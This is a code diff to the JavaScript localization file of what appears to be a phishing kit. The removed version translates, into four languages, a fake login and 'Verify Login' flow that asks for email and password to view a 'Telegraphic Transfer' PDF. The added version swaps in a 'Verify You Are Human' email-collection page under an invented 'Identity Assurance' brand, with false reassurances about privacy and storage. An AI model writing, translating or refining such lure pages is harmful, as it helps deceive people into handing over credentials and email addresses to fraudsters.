@@ -1,131 +1,89 @@
 const translations = {
     en: {
-        pageTitle: 'Login',
-        page2Title: 'Verify Login',
+        headerTitle: 'Verify You Are Human',
+        instructionText: 'Please enter your email address to continue.',
         emailLabel: 'Email Address',
-        passwordLabel: 'Password',
-        rememberLabel: 'Remember me',
         continueBtn: 'Continue',
-        submitBtn: 'Continue to PDF',
-        verifyBtn: 'Access PDF',
-        viewPdfText: 'View Telegraphic Transfer',
-        viewPdfLink: 'View PDF',
+        noticeTitle: 'Important Notice',
+        noticeText: 'This page verifies human users. Your email is used only for access validation and is not stored permanently. By clicking "Continue", you consent to this verification process.',
+        privacyText: 'Privacy Protected',
+        copyrightText: '© 2025 Identity Assurance',
         emailError: 'Please enter a valid email address',
-        passwordError: 'Password must be at least 6 characters',
-        credentialsError: 'Email or password does not match',
-        successText: 'Login successful! Redirecting...',
-        verifySuccessText: 'Verification successful! Opening PDF...',
-        changeEmail: 'Change'
+        placeholder: 'user@business.com'
     },
     es: {
-        pageTitle: 'Iniciar Sesión',
-        page2Title: 'Verificar Inicio de Sesión',
-        emailLabel: 'Correo Electrónico',
-        passwordLabel: 'Contraseña',
-        rememberLabel: 'Recuérdame',
+        headerTitle: 'Verificar que eres humano',
+        instructionText: 'Por favor ingresa tu dirección de correo electrónico para continuar.',
+        emailLabel: 'Dirección de Correo',
         continueBtn: 'Continuar',
-        submitBtn: 'Continuar a PDF',
-        verifyBtn: 'Acceder a PDF',
-        viewPdfText: 'Ver Transferencia Telegráfica',
-        viewPdfLink: 'Ver PDF',
+        noticeTitle: 'Aviso Importante',
+        noticeText: 'Esta página verifica usuarios humanos. Tu correo se utiliza solo para validación de acceso y no se almacena permanentemente. Al hacer clic en "Continuar", aceptas este proceso de verificación.',
+        privacyText: 'Privacidad Protegida',
+        copyrightText: '© 2025 Identity Assurance',
         emailError: 'Por favor ingresa un correo electrónico válido',
-        passwordError: 'La contraseña debe tener al menos 6 caracteres',
-        credentialsError: 'El correo electrónico o la contraseña no coinciden',
-        successText: '¡Inicio de sesión exitoso! Redirigiendo...',
-        verifySuccessText: '¡Verificación exitosa! Abriendo PDF...',
-        changeEmail: 'Cambiar'
+        placeholder: 'usuario@empresa.com'
     },
     fr: {
-        pageTitle: 'Connexion',
-        page2Title: 'Vérifier la Connexion',
-        emailLabel: 'Adresse Email',
-        passwordLabel: 'Mot de passe',
-        rememberLabel: 'Se souvenir de moi',
+        headerTitle: 'Vérifier que vous êtes humain',
+        instructionText: 'Veuillez entrer votre adresse e-mail pour continuer.',
+        emailLabel: 'Adresse E-mail',
         continueBtn: 'Continuer',
-        submitBtn: 'Continuer vers le PDF',
-        verifyBtn: 'Accéder au PDF',
-        viewPdfText: 'Voir le Virement Télégraphique',
-        viewPdfLink: 'Voir le PDF',
-        emailError: 'Veuillez entrer une adresse email valide',
-        passwordError: 'Le mot de passe doit contenir au moins 6 caractères',
-        credentialsError: 'L\'email ou le mot de passe ne correspond pas',
-        successText: 'Connexion réussie! Redirection...',
-        verifySuccessText: 'Vérification réussie! Ouverture du PDF...',
-        changeEmail: 'Modifier'
+        noticeTitle: 'Avis Important',
+        noticeText: 'Cette page vérifie les utilisateurs humains. Votre e-mail est utilisé uniquement pour la validation d\'accès et n\'est pas stocké de manière permanente. En cliquant sur "Continuer", vous consentez à ce processus de vérification.',
+        privacyText: 'Confidentialité Protégée',
+        copyrightText: '© 2025 Identity Assurance',
+        emailError: 'Veuillez entrer une adresse e-mail valide',
+        placeholder: 'utilisateur@entreprise.com'
     },
     zh: {
-        pageTitle: '登录',
-        page2Title: '验证登录',
+        headerTitle: '验证您是人类',
+        instructionText: '请输入您的电子邮件地址以继续。',
         emailLabel: '电子邮件地址',
-        passwordLabel: '密码',
-        rememberLabel: '记住我',
         continueBtn: '继续',
-        submitBtn: '继续查看PDF',
-        verifyBtn: '访问PDF',
-        viewPdfText: '查看电汇单',
-        viewPdfLink: '查看PDF',
+        noticeTitle: '重要通知',
+        noticeText: '此页面验证人类用户。您的电子邮件仅用于访问验证，不会永久存储。点击"继续"即表示您同意此验证流程。',
+        privacyText: '隐私保护',
+        copyrightText: '© 2025 Identity Assurance',
         emailError: '请输入有效的电子邮件地址',
-        passwordError: '密码必须至少为6个字符',
-        credentialsError: '电子邮件或密码不匹配',
-        successText: '登录成功!正在重定向...',
-        verifySuccessText: '验证成功!正在打开PDF...',
-        changeEmail: '修改'
+        placeholder: 'user@business.com'
     }
 };
 
 function setLanguage(lang) {
     localStorage.setItem('preferredLanguage', lang);
     
-    const pageTitle = document.getElementById('pageTitle');
-    const isPage2 = window.location.pathname.includes('page2');
-    
-    if (isPage2) {
-        pageTitle.textContent = translations[lang].page2Title;
-        if (document.getElementById('verifyBtn')) {
-            document.getElementById('verifyBtn').textContent = translations[lang].verifyBtn;
-        }
-        if (document.getElementById('successText')) {
-            document.getElementById('successText').textContent = translations[lang].verifySuccessText;
-        }
-    } else {
-        pageTitle.textContent = translations[lang].pageTitle;
-        if (document.getElementById('continueBtn')) {
-            document.getElementById('continueBtn').textContent = translations[lang].continueBtn;
-        }
-        if (document.getElementById('submitBtn')) {
-            document.getElementById('submitBtn').textContent = translations[lang].submitBtn;
-        }
-        if (document.getElementById('successText')) {
-            document.getElementById('successText').textContent = translations[lang].successText;
-        }
+    if (document.getElementById('headerTitle')) {
+        document.getElementById('headerTitle').textContent = translations[lang].headerTitle;
     }
-    
+    if (document.getElementById('instructionText')) {
+        document.getElementById('instructionText').textContent = translations[lang].instructionText;
+    }
     if (document.getElementById('emailLabel')) {
         document.getElementById('emailLabel').textContent = translations[lang].emailLabel;
     }
-    if (document.getElementById('passwordLabel')) {
-        document.getElementById('passwordLabel').textContent = translations[lang].passwordLabel;
+    if (document.getElementById('continueBtn')) {
+        document.getElementById('continueBtn').textContent = translations[lang].continueBtn;
     }
-    if (document.getElementById('rememberLabel')) {
-        document.getElementById('rememberLabel').textContent = translations[lang].rememberLabel;
+    if (document.getElementById('noticeTitle')) {
+        document.getElementById('noticeTitle').textContent = translations[lang].noticeTitle;
+    }
+    if (document.getElementById('noticeText')) {
+        document.getElementById('noticeText').textContent = translations[lang].noticeText;
+    }
+    if (document.getElementById('privacyText')) {
+        document.getElementById('privacyText').textContent = translations[lang].privacyText;
+    }
+    if (document.getElementById('copyrightText')) {
+        document.getElementById('copyrightText').textContent = translations[lang].copyrightText;
     }
     if (document.getElementById('emailError')) {
         document.getElementById('emailError').textContent = translations[lang].emailError;
     }
-    if (document.getElementById('passwordError')) {
-        document.getElementById('passwordError').textContent = translations[lang].passwordError;
-    }
-    if (document.getElementById('changeEmailLink')) {
-        document.getElementById('changeEmailLink').textContent = translations[lang].changeEmail;
-    }
-    if (document.getElementById('viewPdfText')) {
-        document.getElementById('viewPdfText').textContent = translations[lang].viewPdfText;
-    }
-    if (document.getElementById('viewPdfLink')) {
-        document.getElementById('viewPdfLink').textContent = translations[lang].viewPdfLink;
+    if (document.getElementById('email')) {
+        document.getElementById('email').placeholder = translations[lang].placeholder;
     }
     
-    document.querySelectorAll('.lang-btn').forEach(btn => {
+    document.querySelectorAll('.lang-btn')?.forEach(btn => {
         btn.classList.remove('active');
         if (btn.dataset.lang === lang) {
             btn.classList.add('active');
@@ -138,10 +96,4 @@ function setLanguage(lang) {
 document.addEventListener('DOMContentLoaded', function() {
     const preferredLang = localStorage.getItem('preferredLanguage') || 'en';
     setLanguage(preferredLang);
-    
-    document.querySelectorAll('.lang-btn').forEach(btn => {
-        btn.addEventListener('click', function() {
-            setLanguage(this.dataset.lang);
-        });
-    });
 });
